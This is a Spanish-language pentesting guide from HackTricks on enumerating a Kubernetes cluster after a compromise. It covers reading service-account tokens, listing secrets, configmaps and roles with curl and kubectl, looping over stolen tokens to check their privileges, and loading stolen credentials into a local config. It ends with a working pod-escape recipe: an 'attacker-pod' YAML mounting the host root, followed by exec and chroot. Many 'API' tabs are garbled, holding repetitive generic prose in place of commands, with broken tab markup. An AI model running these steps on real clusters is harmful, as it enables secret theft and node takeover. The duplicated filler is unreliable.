# Enumeraci贸n de Kubernetes

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* 隆Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Tokens de Kubernetes

Si has comprometido el acceso a una m谩quina, es posible que el usuario tenga acceso a alguna plataforma de Kubernetes. El token suele estar ubicado en un archivo se帽alado por la **variable de entorno `KUBECONFIG`** o **dentro de `~/.kube`**.

En esta carpeta es posible que encuentres archivos de configuraci贸n con **tokens y configuraciones para conectarse al servidor de API**. Tambi茅n puedes encontrar una carpeta de cach茅 con informaci贸n previamente recuperada.

Si has comprometido un pod dentro de un entorno de Kubernetes, hay otros lugares donde puedes encontrar tokens e informaci贸n sobre el entorno actual de K8:

### Tokens de Cuenta de Servicio

Antes de continuar, si no sabes qu茅 es un servicio en Kubernetes, te sugerir铆a que **sigas este enlace y leas al menos la informaci贸n sobre la arquitectura de Kubernetes**.

Tomado de la [documentaci贸n](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) de Kubernetes:

_"Cuando creas un pod, si no especificas una cuenta de servicio, se le asigna autom谩ticamente la_ cuenta de servicio predeterminada _en el mismo espacio de nombres."_

**ServiceAccount** es un objeto gestionado por Kubernetes y se utiliza para proporcionar una identidad a los procesos que se ejecutan en un pod.\
Cada cuenta de servicio tiene un secreto relacionado y este secreto contiene un token de portador. Este es un JSON Web Token (JWT), un m茅todo para representar reclamaciones de forma segura entre dos partes.

Por lo general, **uno** de los directorios:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

contienen los archivos:

* **ca.crt**: Es el certificado ca para verificar las comunicaciones de Kubernetes
* **namespace**: Indica el espacio de nombres actual
* **token**: Contiene el **token de servicio** del pod actual.

Ahora que tienes el token, puedes encontrar el servidor de API dentro de la variable de entorno **`KUBECONFIG`**. Para obtener m谩s informaci贸n, ejecuta `(env | set) | grep -i "kuber|kube`**`"`**

El token de la cuenta de servicio est谩 firmado por la clave que reside en el archivo **sa.key** y validado por **sa.pub**.

Ubicaci贸n predeterminada en **Kubernetes**:

* /etc/kubernetes/pki

Ubicaci贸n predeterminada en **Minikube**:

* /var/lib/localkube/certs

### Pods Calientes

_**Los pods calientes son**_ pods que contienen un token de cuenta de servicio privilegiado. Un token de cuenta de servicio privilegiado es un token que tiene permiso para realizar tareas privilegiadas como listar secretos, crear pods, etc.

## RBAC

Si no sabes qu茅 es **RBAC**, **lee esta secci贸n**.

## Hoja de Trucos de Enumeraci贸n

Para enumerar un entorno de K8s necesitas un par de cosas:

* Un **token de autenticaci贸n v谩lido**. En la secci贸n anterior vimos d贸nde buscar un token de usuario y un token de cuenta de servicio.
* La **direcci贸n (**_**https://host:port**_**) del API de Kubernetes**. Esto suele encontrarse en las variables de entorno y/o en el archivo de configuraci贸n kube.
* **Opcional**: El **ca.crt para verificar el servidor de API**. Esto se puede encontrar en los mismos lugares donde se puede encontrar el token. Esto es 煤til para verificar el certificado del servidor de API, pero usando `--insecure-skip-tls-verify` con `kubectl` o `-k` con `curl` no necesitar谩s esto.

Con esos detalles puedes **enumerar Kubernetes**. Si el **API** por alguna raz贸n es **accesible** a trav茅s de **Internet**, simplemente puedes descargar esa informaci贸n y enumerar la plataforma desde tu host.

Sin embargo, por lo general el **servidor de API est谩 dentro de una red interna**, por lo tanto necesitar谩s **crear un t煤nel** a trav茅s de la m谩quina comprometida para acceder desde tu m谩quina, o puedes **subir el** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binario, o usar **`curl/wget/cualquier cosa`** para realizar solicitudes HTTP crudas al servidor de API.

### Diferencias entre los verbos `list` y `get`

Con los permisos de **`get`** puedes acceder a informaci贸n de activos espec铆ficos (_opci贸n `describe` en `kubectl`_) de la API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Si tienes el permiso **`list`**, se te permite ejecutar solicitudes API para enumerar un tipo de recurso (_opci贸n `get` en `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Si tienes el permiso **`watch`**, est谩s autorizado para ejecutar solicitudes de API para monitorear activos:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Abren una conexi贸n de transmisi贸n que te devuelve el manifiesto completo de un Despliegue cada vez que cambia (o cuando se crea uno nuevo).

{% hint style="danger" %}
Los siguientes comandos `kubectl` indican c贸mo listar los objetos. Si deseas acceder a los datos, debes usar `describe` en lugar de `get`.
{% endhint %}

### Usando curl

Desde dentro de un pod, puedes utilizar varias variables de entorno:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Por defecto, el pod puede **acceder** al **servidor kube-api** en el nombre de dominio **`kubernetes.default.svc`** y puedes ver la red kube en **`/etc/resolv.config`** ya que aqu铆 encontrar谩s la direcci贸n del servidor DNS de kubernetes (el ".1" del mismo rango es el punto final de kube-api).
{% endhint %}

### Usando kubectl

Teniendo el token y la direcci贸n del servidor API, puedes usar kubectl o curl para acceder como se indica aqu铆:

Por defecto, el APISERVER se comunica con el esquema `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> si no hay `https://` en la URL, es posible que obtengas un Error como Bad Request.

Puedes encontrar una [**hoja de trucos oficial de kubectl aqu铆**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). El objetivo de las siguientes secciones es presentar de manera ordenada diferentes opciones para enumerar y comprender el nuevo K8s al que has obtenido acceso.

Para encontrar la solicitud HTTP que env铆a `kubectl`, puedes usar el par谩metro `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Configuraci贸n Actual

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Si lograste robar algunas credenciales de usuarios, puedes **configurarlas localmente** usando algo como:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Obtener Recursos Soportados

Con esta informaci贸n sabr谩s todos los servicios que puedes listar

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Obtener Privilegios Actuales

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

La enumeraci贸n de Kubernetes es un proceso crucial durante una evaluaci贸n de seguridad. Permite a los pentesters recopilar informaci贸n valiosa sobre los recursos desplegados en el cl煤ster de Kubernetes, lo que puede ayudar a identificar posibles puntos de entrada para explotar.

#### Pasos para la enumeraci贸n de Kubernetes:

1. **Descubrimiento de servicios**: Identificar los servicios expuestos en el cl煤ster de Kubernetes, como API Server, Dashboard, y otros servicios.

2. **Enumeraci贸n de recursos**: Enumerar los recursos desplegados, como pods, deployments, services, y otros objetos para comprender la arquitectura del cl煤ster.

3. **Enumeraci贸n de roles y permisos**: Identificar roles y permisos asignados a los servicios y usuarios para detectar posibles configuraciones inseguras.

4. **Enumeraci贸n de secretos**: Buscar secretos almacenados en el cl煤ster, como tokens de acceso, contrase帽as, y certificados, que podr铆an ser utilizados en ataques.

5. **Enumeraci贸n de almacenamiento**: Identificar vol煤menes de almacenamiento y configuraciones de almacenamiento para posibles puntos de acceso a datos sensibles.

La enumeraci贸n exhaustiva de Kubernetes es esencial para comprender la superficie de ataque y fortalecer la seguridad del cl煤ster. 

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Otra forma de verificar tus privilegios es utilizando la herramienta: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Puedes aprender m谩s sobre **Kubernetes RBAC** en:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Una vez que sepas qu茅 privilegios** tienes, revisa la siguiente p谩gina para averiguar **si puedes abusar de ellos** para escalar privilegios:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Obtener otros roles

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

Durante la fase de enumeraci贸n, un atacante intentar谩 recopilar la mayor cantidad de informaci贸n posible sobre el cl煤ster de Kubernetes objetivo. Esto puede incluir:

- Descubrimiento de servicios y pods en el cl煤ster.
- Identificaci贸n de roles y permisos asignados a los servicios.
- Enumeraci贸n de configuraciones de red y almacenamiento.
- Recopilaci贸n de informaci贸n sobre versiones de software y posibles vulnerabilidades.

Esta informaci贸n recopilada durante la enumeraci贸n ser谩 crucial para planificar y llevar a cabo ataques m谩s avanzados contra el cl煤ster de Kubernetes. 

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Obtener namespaces

Kubernetes admite **m煤ltiples cl煤steres virtuales** respaldados por el mismo cl煤ster f铆sico. Estos cl煤steres virtuales se llaman **namespaces**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

Durante la fase de enumeraci贸n, un atacante intentar谩 recopilar la mayor cantidad de informaci贸n posible sobre el cl煤ster de Kubernetes objetivo. Esto puede incluir la obtenci贸n de informaci贸n sobre los pods, servicios, roles, permisos y configuraciones de red. La enumeraci贸n es un paso crucial en el proceso de pentesting, ya que proporciona al atacante una visi贸n general de la superficie de ataque y posibles vectores de ataque.

Algunas t茅cnicas comunes de enumeraci贸n en Kubernetes incluyen:

- Enumeraci贸n de pods: identificar los pods en ejecuci贸n en el cl煤ster.
- Enumeraci贸n de servicios: identificar los servicios expuestos en el cl煤ster.
- Enumeraci贸n de roles y permisos: identificar los roles y permisos asignados a los usuarios y servicios en el cl煤ster.
- Enumeraci贸n de configuraciones de red: identificar la configuraci贸n de red del cl煤ster, como pol铆ticas de red y reglas de firewall.

La informaci贸n recopilada durante la enumeraci贸n se puede utilizar para identificar posibles vulnerabilidades y puntos d茅biles en el cl煤ster de Kubernetes, lo que puede ayudar al atacante a planificar y ejecutar ataques de manera m谩s efectiva. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Obtener secretos

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

Durante la fase de enumeraci贸n, un atacante intentar谩 recopilar informaci贸n sobre los recursos de Kubernetes disponibles en el cl煤ster. Esto puede incluir la obtenci贸n de informaci贸n sobre los pods, servicios, vol煤menes persistentes, roles y permisos, entre otros. La enumeraci贸n es un paso cr铆tico en el proceso de pentesting, ya que proporciona al atacante una visi贸n general de la superficie de ataque y posibles vectores de ataque.

Algunas t茅cnicas comunes de enumeraci贸n en Kubernetes incluyen:

- Enumeraci贸n de pods: identificar los pods en ejecuci贸n en el cl煤ster.
- Enumeraci贸n de servicios: identificar los servicios expuestos en el cl煤ster.
- Enumeraci贸n de roles y permisos: identificar los roles y permisos asignados a los usuarios y servicios en el cl煤ster.
- Enumeraci贸n de vol煤menes persistentes: identificar los vol煤menes persistentes utilizados en el cl煤ster.

La informaci贸n recopilada durante la enumeraci贸n puede ayudar al atacante a identificar posibles puntos de entrada y a planificar ataques m谩s espec铆ficos contra el cl煤ster de Kubernetes. Es importante realizar una enumeraci贸n exhaustiva durante una evaluaci贸n de seguridad para comprender completamente la superficie de ataque y mitigar posibles riesgos de seguridad. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Si puedes leer secretos, puedes usar las siguientes l铆neas para obtener los privilegios relacionados con cada token:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Obtener Cuentas de Servicio

Como se discuti贸 al principio de esta p谩gina, **cuando se ejecuta un pod, generalmente se le asigna una cuenta de servicio**. Por lo tanto, listar las cuentas de servicio, sus permisos y d贸nde se est谩n ejecutando puede permitir a un usuario escalar privilegios.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

La enumeraci贸n en Kubernetes es un proceso crucial durante una evaluaci贸n de seguridad. Aqu铆 hay algunas t茅cnicas comunes para enumerar recursos en un cl煤ster de Kubernetes:

1. **Enumeraci贸n de servicios**: Utilice comandos como `kubectl get services` para enumerar los servicios expuestos en el cl煤ster.

2. **Enumeraci贸n de pods**: Utilice `kubectl get pods --all-namespaces` para listar todos los pods en el cl煤ster, incluidos los que pueden estar ocultos en otros namespaces.

3. **Enumeraci贸n de roles y permisos**: Verifique los roles y permisos asignados a los usuarios y servicios en el cl煤ster utilizando comandos como `kubectl get roles` y `kubectl get rolebindings`.

4. **Enumeraci贸n de secretos**: Utilice `kubectl get secrets --all-namespaces` para listar los secretos almacenados en el cl煤ster, lo que puede revelar informaci贸n confidencial.

5. **Enumeraci贸n de almacenamiento persistente**: Verifique los vol煤menes de almacenamiento persistente utilizando comandos como `kubectl get pvc` para identificar posibles puntos de acceso para la persistencia de datos.

Al enumerar estos recursos, un pentester puede descubrir posibles puntos d茅biles en la configuraci贸n de seguridad de Kubernetes y ayudar a fortalecerla. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### Obtener Despliegues

Los despliegues especifican los **componentes** que necesitan ser **ejecutados**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

Durante la fase de enumeraci贸n, es crucial recopilar informaci贸n detallada sobre el cl煤ster de Kubernetes objetivo. Esto puede incluir:

- Versiones de Kubernetes y complementos instalados
- Configuraciones de red y pol铆ticas de red
- Roles y permisos de los servicios y cuentas de servicio
- Almacenamiento persistente y configuraciones de almacenamiento
- Configuraciones de seguridad como RBAC y Network Policies

Esta informaci贸n es fundamental para identificar posibles puntos de entrada y debilidades en el cl煤ster de Kubernetes.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Obtener Pods

Los Pods son los **contenedores** reales que se **ejecutar谩n**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

Durante la fase de enumeraci贸n, un atacante intentar谩 recopilar la mayor cantidad de informaci贸n posible sobre el cl煤ster de Kubernetes objetivo. Esto puede incluir la obtenci贸n de informaci贸n sobre los nodos, pods, servicios, roles, permisos y cualquier otra entidad dentro del cl煤ster.

#### Herramientas de Enumeraci贸n

Algunas herramientas comunes utilizadas para la enumeraci贸n de cl煤steres de Kubernetes incluyen:

- **kubectl**: La herramienta de l铆nea de comandos oficial para interactuar con cl煤steres de Kubernetes.
- **kube-hunter**: Una herramienta de c贸digo abierto que ayuda a identificar posibles puntos d茅biles en cl煤steres de Kubernetes.
- **kubeletctl**: Una herramienta que interact煤a con el kubelet API para obtener informaci贸n sobre los nodos y pods en un cl煤ster de Kubernetes.

#### M茅todos de Enumeraci贸n

Algunos m茅todos comunes utilizados para enumerar cl煤steres de Kubernetes incluyen:

1. **Enumeraci贸n de nodos**: Identificar los nodos que forman parte del cl煤ster de Kubernetes.
2. **Enumeraci贸n de pods**: Obtener informaci贸n sobre los pods desplegados en el cl煤ster.
3. **Enumeraci贸n de servicios**: Identificar los servicios expuestos dentro del cl煤ster.
4. **Enumeraci贸n de roles y permisos**: Identificar los roles y permisos asignados a los usuarios y servicios dentro del cl煤ster.

La enumeraci贸n efectiva de un cl煤ster de Kubernetes puede proporcionar a un atacante informaci贸n valiosa para planificar y ejecutar ataques dirigidos de manera m谩s efectiva. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Obtener Servicios

Los **servicios** de Kubernetes se utilizan para **exponer un servicio en un puerto y IP espec铆ficos** (que actuar谩n como balanceador de carga para los pods que realmente ofrecen el servicio). Es interesante saber d贸nde se pueden encontrar otros servicios para intentar atacar.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

Durante la fase de enumeraci贸n, se pueden utilizar varias t茅cnicas para recopilar informaci贸n sobre el cl煤ster de Kubernetes objetivo. Algunas de las t茅cnicas comunes incluyen:

- **Descubrimiento de servicios**: Identificar los servicios expuestos en el cl煤ster de Kubernetes, como API Server, Dashboard, etc.
- **Enumeraci贸n de pods**: Enumerar los pods desplegados en el cl煤ster para identificar posibles puntos de entrada.
- **Enumeraci贸n de roles y permisos**: Identificar los roles y permisos asignados a los servicios y usuarios en el cl煤ster.
- **Enumeraci贸n de almacenamiento**: Identificar los vol煤menes de almacenamiento y configuraciones relacionadas.
- **Enumeraci贸n de secretos**: Identificar los secretos almacenados en el cl煤ster que pueden contener informaci贸n sensible.

Estas t茅cnicas de enumeraci贸n pueden proporcionar informaci贸n valiosa para llevar a cabo un an谩lisis de seguridad m谩s profundo en el cl煤ster de Kubernetes. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Obtener nodos

Obtener todos los **nodos configurados dentro del cl煤ster**.
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

La enumeraci贸n de Kubernetes es un proceso crucial durante una evaluaci贸n de seguridad. Permite a los pentesters recopilar informaci贸n sobre los recursos desplegados en el cl煤ster de Kubernetes, como pods, servicios, roles, y m谩s. Esta informaci贸n es fundamental para identificar posibles puntos de entrada y vulnerabilidades en el cl煤ster.

#### T茅cnicas de Enumeraci贸n

Algunas t茅cnicas comunes de enumeraci贸n en Kubernetes incluyen:

- Enumeraci贸n de pods: Identificar los pods desplegados en el cl煤ster.
- Enumeraci贸n de servicios: Identificar los servicios expuestos en el cl煤ster.
- Enumeraci贸n de roles y permisos: Identificar los roles y permisos asignados en el cl煤ster.
- Enumeraci贸n de almacenamiento: Identificar los vol煤menes de almacenamiento utilizados en el cl煤ster.

Estas t茅cnicas ayudan a los pentesters a comprender la arquitectura del cl煤ster de Kubernetes y a identificar posibles vectores de ataque. Es importante realizar una enumeraci贸n exhaustiva para garantizar una evaluaci贸n de seguridad completa. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Obtener DaemonSets

**DaeamonSets** permite asegurar que un **pod espec铆fico se est茅 ejecutando en todos los nodos** del cl煤ster (o en los seleccionados). Si eliminas el DaemonSet, los pods gestionados por 茅l tambi茅n ser谩n eliminados.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

La enumeraci贸n en Kubernetes es un proceso crucial durante una evaluaci贸n de seguridad. Permite a los pentesters recopilar informaci贸n sobre los recursos desplegados en el cl煤ster, como pods, servicios, roles, y m谩s. Esta informaci贸n es fundamental para identificar posibles puntos de entrada y vulnerabilidades en el entorno de Kubernetes.

#### T茅cnicas de Enumeraci贸n

Algunas t茅cnicas comunes de enumeraci贸n en Kubernetes incluyen:

- Enumeraci贸n de pods: Identificar los pods desplegados en el cl煤ster, as铆 como sus im谩genes y configuraciones.
- Enumeraci贸n de servicios: Identificar los servicios expuestos en el cl煤ster y sus configuraciones.
- Enumeraci贸n de roles y permisos: Identificar los roles y permisos asignados a los diferentes servicios y usuarios en el cl煤ster.
- Enumeraci贸n de almacenamiento: Identificar los vol煤menes de almacenamiento y configuraciones asociadas en el cl煤ster.

Estas t茅cnicas ayudan a los pentesters a comprender mejor la arquitectura y configuraci贸n del cl煤ster de Kubernetes, lo que a su vez les permite identificar posibles vectores de ataque y 谩reas de mejora en la seguridad.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### Obtener cronjob

Los trabajos cron permiten programar, utilizando una sintaxis similar a crontab, el lanzamiento de un pod que realizar谩 alguna acci贸n.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

Durante la fase de enumeraci贸n, un atacante intentar谩 recopilar la mayor cantidad de informaci贸n posible sobre el cl煤ster de Kubernetes objetivo. Esto puede incluir la obtenci贸n de informaci贸n sobre los pods, servicios, roles, permisos y configuraciones de red. La enumeraci贸n es un paso crucial en el proceso de pentesting, ya que proporciona al atacante una visi贸n general de la superficie de ataque y posibles vectores de ataque.

#### Herramientas de Enumeraci贸n

Algunas herramientas comunes utilizadas para la enumeraci贸n de cl煤steres de Kubernetes incluyen:

- **kubectl**: La herramienta de l铆nea de comandos oficial de Kubernetes que se puede utilizar para interactuar con cl煤steres de Kubernetes.
- **kube-hunter**: Una herramienta de c贸digo abierto que ayuda a identificar posibles puntos d茅biles en cl煤steres de Kubernetes.
- **kubeletctl**: Una herramienta que se puede utilizar para interactuar con el kubelet y obtener informaci贸n sobre los nodos del cl煤ster.

#### Informaci贸n a Recopilar

Durante la enumeraci贸n, un atacante puede intentar recopilar la siguiente informaci贸n:

- **Informaci贸n de los pods**: Listar los pods en el cl煤ster y obtener detalles sobre sus im谩genes, vol煤menes montados y configuraciones.
- **Informaci贸n de los servicios**: Identificar los servicios expuestos en el cl煤ster y sus configuraciones.
- **Roles y permisos**: Obtener informaci贸n sobre los roles y permisos asignados en el cl煤ster.
- **Configuraciones de red**: Identificar la configuraci贸n de red del cl煤ster, incluidos los servicios expuestos y las pol铆ticas de red.

La informaci贸n recopilada durante la enumeraci贸n puede ayudar al atacante a identificar posibles vulnerabilidades y puntos de entrada en el cl煤ster de Kubernetes. Es importante realizar una enumeraci贸n exhaustiva para comprender completamente la superficie de ataque y planificar los siguientes pasos del ataque de manera efectiva.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Obtener configMap

configMap siempre contiene mucha informaci贸n y archivos de configuraci贸n que proporcionan a las aplicaciones que se ejecutan en el kubernetes. Por lo general, puedes encontrar muchas contrase帽as, secretos, tokens que se utilizan para conectarse y validar otros servicios internos/externos.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeraci贸n de Kubernetes

La enumeraci贸n de Kubernetes es un proceso crucial durante una evaluaci贸n de seguridad. Permite a los pentesters recopilar informaci贸n valiosa sobre los recursos, configuraciones y permisos dentro de un cl煤ster de Kubernetes. Algunas t茅cnicas comunes de enumeraci贸n incluyen la identificaci贸n de servicios expuestos, la enumeraci贸n de pods y la b煤squeda de credenciales expuestas.

#### Herramientas de Enumeraci贸n

Existen varias herramientas que pueden ayudar en el proceso de enumeraci贸n de Kubernetes, como `kube-hunter`, `kubesec`, `kubiscan` y `kubi`.

#### Pasos de Enumeraci贸n

1. Identificar servicios expuestos: Utilice herramientas como `kube-hunter` para identificar servicios expuestos en el cl煤ster de Kubernetes.
2. Enumerar pods: Utilice comandos como `kubectl get pods --all-namespaces` para enumerar todos los pods en el cl煤ster.
3. Buscar credenciales expuestas: Realice b煤squedas en repositorios p煤blicos y en la web para identificar posibles credenciales expuestas involuntariamente.

La enumeraci贸n de Kubernetes es un paso fundamental para comprender la superficie de ataque y las posibles vulnerabilidades en un cl煤ster de Kubernetes.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Obtener "todo"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Obtener consumos de Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Escapando del pod

Si puedes crear nuevos pods, es posible que puedas escapar de ellos hacia el nodo. Para lograrlo, necesitas crear un nuevo pod utilizando un archivo yaml, cambiar al pod creado y luego hacer chroot en el sistema del nodo. Puedes utilizar pods ya existentes como referencia para el archivo yaml, ya que muestran im谩genes y rutas existentes.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> Si necesitas crear un pod en un nodo espec铆fico, puedes usar el siguiente comando para obtener las etiquetas del nodo
>
> `k get nodes --show-labels`
>
> Com煤nmente, kubernetes.io/hostname y node-role.kubernetes.io/master son buenas etiquetas para seleccionar.
>
> [referencia]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[archivo yaml original](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Despu茅s de eso, creas el pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Ahora puedes cambiar al pod creado de la siguiente manera:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Y finalmente haces chroot en el sistema del nodo
```bash
chroot /root /bin/bash
```
Informaci贸n obtenida de: [Kubernetes Namespace Breakout usando Volumen de Ruta de Host Insegura - Parte 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Atacando y Defendiendo Kubernetes: Bust-A-Kube - Episodio 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Referencias

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

